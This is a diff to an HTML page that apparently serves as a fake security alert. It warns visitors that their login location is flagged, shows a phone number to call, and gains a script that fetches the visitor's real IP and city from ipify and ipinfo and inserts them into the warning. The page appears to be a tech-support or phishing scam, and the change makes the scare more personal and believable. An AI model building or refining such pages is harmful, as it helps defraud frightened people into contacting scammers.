@@ -122,13 +122,42 @@
       <p class="alert-message">
         <strong>Do not attempt to log in from this IP address</strong> as it may be associated with unauthorized activity. Access from this location has been flagged for your protection.
       </p>
-      <p class="alert-message">
-        The suspicious activity was detected from IP address <strong>192.168.1.1</strong>, originating from <strong>New York, NY, USA</strong>.
+
+      <!-- Dynamic IP Address and Location -->
+      <p class="alert-message" id="location-message">
+        Your IP address <strong id="user-ip"></strong> is being detected from <strong id="user-location">loading...</strong>.
       </p>
-      <p class="alert-message">
-        This location has been flagged as potentially harmful. To avoid further complications, please refrain from attempting to log in from this IP.
-      </p>
+
       <a href="tel:+18282836253" class="phone-number">+1-828-283-6253</a>
     </div>
+
+    <!-- Script to fetch IP and location -->
+    <script>
+      // Fetch user's IP and location
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip;
+          document.getElementById('user-ip').textContent = userIP;
+
+          // Use ipstack or ipinfo to get geolocation info based on IP
+          fetch(`https://ipinfo.io/${userIP}/json?token=YOUR_API_KEY`)
+            .then(response => response.json())
+            .then(locationData => {
+              const location = locationData.city + ', ' + locationData.region + ', ' + locationData.country;
+              document.getElementById('user-location').textContent = location;
+            })
+            .catch(err => {
+              console.error("Location fetch error:", err);
+              document.getElementById('user-location').textContent = 'Unknown';
+            });
+        })
+        .catch(err => {
+          console.error("IP fetch error:", err);
+          document.getElementById('user-ip').textContent = 'Unknown';
+          document.getElementById('user-location').textContent = 'Unknown';
+        });
+    </script>
+
   </body>
 </html>
